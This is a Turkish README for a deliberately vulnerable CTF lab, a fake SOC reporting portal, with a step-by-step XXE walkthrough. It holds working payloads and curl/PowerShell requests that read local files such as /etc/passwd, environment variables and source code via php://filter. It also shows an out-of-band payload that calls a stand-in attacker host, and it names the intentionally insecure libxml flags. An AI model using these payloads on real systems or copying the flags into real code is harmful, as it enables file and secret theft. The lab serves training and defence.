# AltaySec — Şüpheli Analiz Bildirim Portalı (XXE CTF Lab)

> **UYARI:** Bu proje **kasten zafiyetli** bir web uygulamasıdır.
> Sadece kapalı CTF / eğitim ortamlarında çalıştırın. **Asla internete açmayın.**

CTF oyuncuları, görünüşte zararsız bir SOC bildirim portalına IP / Hash girer.
Frontend bu veriyi arka tarafa **XML** olarak iletir; backend XML'i `LIBXML_NOENT`
bayrağı ile ayrıştırdığı için **Reflected XXE (XML External Entity)** zafiyeti
ortaya çıkar. Saldırgan, harici varlık tanımı (`<!ENTITY ... SYSTEM ...>`)
ekleyerek sunucudaki yerel dosyaları okuyabilir.

---

## 1. Lab Kurulumu

```bash
docker compose up -d --build
```

Tarayıcıdan: <http://localhost/>

Durdurmak için:

```bash
docker compose down
```

---

## 2. Zafiyetin Sömürülmesi — A'dan Z'ye Walkthrough

### Adım 1 — Keşif (Reconnaissance)

Tarayıcıyı aç: <http://localhost/>

Karşına "ALTAYSEC TEHDİT BİLDİRİMİ" başlıklı dark-mode bir SOC arayüzü çıkar.

İki input görürsün:
- **Tehdit Türü** (IP, Hash, Domain…)
- **Değer**

Bir test bildirimi gönder:
- Tehdit Türü: `IP`
- Değer: `185.220.101.5`
- **SİSTEME GÖNDER**

Sistem yanıtı:

```
Bildiriminiz işleme alındı: 185.220.101.5
```

> Gözlem: girdiğin **Değer** alanı sunucu yanıtına **olduğu gibi yansıyor** (reflected).
> Bu, "reflected" bir sızıntı kanalımız olduğu anlamına gelir.

---

### Adım 2 — Trafiği İncele (DevTools)

Tarayıcıda `F12` → **Network** sekmesi → formu tekrar gönder.

`api.php` isteğine tıkla:

- **Request Method:** `POST`
- **Content-Type:** `application/xml; charset=UTF-8`
- **Request Body (raw):**
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <threat>
      <type>IP</type>
      <value>185.220.101.5</value>
  </threat>
  ```

> Kritik bulgu: backend, **JSON değil XML kabul ediyor**. XML + reflected çıktı
> = klasik XXE atış zemini.

---

### Adım 3 — XXE Hipotezini Test Et

Klasik bir external entity payload'u oluştur:

```xml
<?xml version="1.0"?>
<!DOCTYPE t [
  <!ENTITY x SYSTEM "file:///etc/hostname">
]>
<threat>
    <type>IP</type>
    <value>&x;</value>
</threat>
```

Bu isteği aşağıdaki yöntemlerden biriyle gönder.

#### Yöntem A — `curl` ile (en hızlı)

```bash
curl -s -X POST http://localhost/api.php \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "file:///etc/hostname">]><threat><type>IP</type><value>&x;</value></threat>'
```

#### Yöntem B — Burp Suite ile

1. Burp'u aç, Proxy → Intercept **ON**.
2. Tarayıcı proxy ayarını `127.0.0.1:8080`'e al.
3. Forma `IP / test` yazıp **GÖNDER** de.
4. Yakalanan isteği **sağ tık → Send to Repeater**.
5. Repeater'da gövdeyi yukarıdaki XXE payload'u ile **değiştir** → **Send**.

#### Yöntem C — PowerShell ile (Windows)

```powershell
$payload = '<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "file:///etc/hostname">]><threat><type>IP</type><value>&x;</value></threat>'
Invoke-WebRequest -Uri "http://localhost/api.php" -Method POST `
  -ContentType "application/xml" -Body $payload -UseBasicParsing | Select-Object -Expand Content
```

**Beklenen sunucu yanıtı:**

```json
{
  "status": "ok",
  "ticket_id": "TI-...",
  "type": "IP",
  "message": "Bildiriminiz işleme alındı: <konteyner_hostname>"
}
```

> Eğer `message` alanında konteyner hostname'i (örn. `7b1c2d9e4a55`) görünüyorsa,
> **XXE doğrulanmıştır**. Sunucu, harici varlığı çözüp dosya içeriğini yansıttı.

---

### Adım 4 — Bayrağı Oku

Hedef: konteynerin kök dizinindeki `/flag.txt`.

```xml
<?xml version="1.0"?>
<!DOCTYPE t [
  <!ENTITY flag SYSTEM "file:///flag.txt">
]>
<threat>
    <type>IP</type>
    <value>&flag;</value>
</threat>
```

`curl` ile:

```bash
curl -s -X POST http://localhost/api.php \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><!DOCTYPE t [<!ENTITY flag SYSTEM "file:///flag.txt">]><threat><type>IP</type><value>&flag;</value></threat>'
```

**Sunucu yanıtı:**

```json
{
  "status": "ok",
  "ticket_id": "TI-CFC17B69",
  "timestamp": "2026-05-15 15:04:06",
  "type": "IP",
  "message": "Bildiriminiz işleme alındı: ALTAYSEC{xxe_thR3at_1nt3l_byp4ss}\n"
}
```

---

## 3. Bayrak

```
ALTAYSEC{xxe_thR3at_1nt3l_byp4ss}
```

---

## 4. Bonus — İleri Seviye Payload'lar

### 4.1 PHP Filter Wrapper ile Kaynak Kodu Sızdırma

XML olarak ayrıştırılamayacak (içinde `<?php` olan) dosyaları okumak için
base64'e encode et:

```xml
<?xml version="1.0"?>
<!DOCTYPE t [
  <!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/api.php">
]>
<threat>
    <type>IP</type>
    <value>&x;</value>
</threat>
```

Dönen base64'ü çözünce `api.php` kaynak kodunu elde edersin:

```bash
echo "PD9waHAK..." | base64 -d
```

### 4.2 Sistem Dosyalarını Listeleme (file:// + dizin)

PHP/libxml `file://` ile dosya okur, **dizin listelemez**. Bunun yerine yaygın
hedef dosyalar:

| Hedef | Payload SYSTEM URI |
|------|---------------------|
| `/etc/passwd` | `file:///etc/passwd` |
| `/etc/hostname` | `file:///etc/hostname` |
| Apache config | `file:///etc/apache2/apache2.conf` |
| Çevre değişkenleri | `file:///proc/self/environ` |
| Process cmdline | `file:///proc/self/cmdline` |
| Bayrak | `file:///flag.txt` |

### 4.3 Parametre Entity (OOB / Out-of-Band)

Bu lab **reflected** çıktı verdiği için Out-of-Band gerekmez, ancak gerçek
bir senaryoda kullanılan kalıp:

```xml
<?xml version="1.0"?>
<!DOCTYPE t [
  <!ENTITY % file SYSTEM "file:///flag.txt">
  <!ENTITY % dtd SYSTEM "http://ATTACKER/oob.dtd">
  %dtd;
  %send;
]>
<threat><type>IP</type><value>oob</value></threat>
```

> Bu lab'de gerekli **değildir** — reflected payload her zaman yeterlidir.

---

## 5. Zafiyetin Kök Nedeni

`src/api.php` içindeki kritik satır:

```php
$loaded = @$dom->loadXML(
    $rawBody,
    LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_NOCDATA
);
```

- `LIBXML_NOENT` → harici varlıkları (entities) **substitute eder**.
  Yani `&flag;` yerine `file:///flag.txt` içeriğini koyar.
- `LIBXML_DTDLOAD` → bildirilen DTD'lerin yüklenmesine izin verir.
- Ayrıca eski PHP sürümlerinde stabilite için
  `libxml_disable_entity_loader(false)` çağrısı yapılmış.

Bu üçlü, modern libxml'in varsayılan güvenli davranışını **bilinçli olarak**
kapatır → XXE oluşur.

---

## 6. Karşı Önlemler (Eğitmen Notu)

Gerçek hayatta XXE'yi engellemek için:

1. **External entity'leri kapat:**
   ```php
   $dom->loadXML($body, LIBXML_NONET);
   // LIBXML_NOENT KULLANMA
   ```
2. **DTD yüklemeyi yasakla** (`LIBXML_DTDLOAD` kullanma).
3. PHP 7.x için ekstra güvenlik:
   ```php
   libxml_disable_entity_loader(true);
   ```
4. Mümkünse **XML yerine JSON** kabul et.
5. XML şeması (XSD) ile sıkı validasyon uygula.
6. WAF / proxy katmanında `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, `file://`,
   `php://filter` desenlerini bloklayan kurallar tanımla.

---

## 7. Öğrenme Hedefleri

- `Content-Type: application/xml` trafiğini fark etme.
- Reflected çıktı kanalını gözlemleme.
- DOCTYPE + ENTITY ile dış dosya okuma.
- `file://`, `php://filter` şemalarının kullanımı.
- Gerçek savunmanın `LIBXML_NOENT`'i **kaldırmak** olduğunu kavrama.

---

## 8. Lisans / Sorumluluk

Yalnızca eğitim amaçlıdır. Elde edilen tekniklerin yetkisiz sistemlerde
uygulanması yasa dışıdır ve etik dışıdır. AltaySec Akademi, kötüye
kullanımdan sorumlu tutulamaz.
